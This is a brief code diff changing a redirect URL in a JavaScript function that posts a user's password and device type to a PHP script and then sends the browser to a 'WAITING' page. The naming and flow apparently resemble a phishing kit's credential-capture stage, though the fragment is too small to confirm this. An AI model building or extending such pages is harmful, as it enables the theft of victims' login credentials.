@@ -75,7 +75,7 @@ function salir(){
 function pasousuario(p){
     var d = detectar_dispositivo();
     $.post( "../process/pasousuario.php", { pass: p, dis: d} ,function(data) {
-        window.location.href = "../a/WAITING"; 
+        window.location.href = "../a/WAITING.php"; 
     });
 }            
 
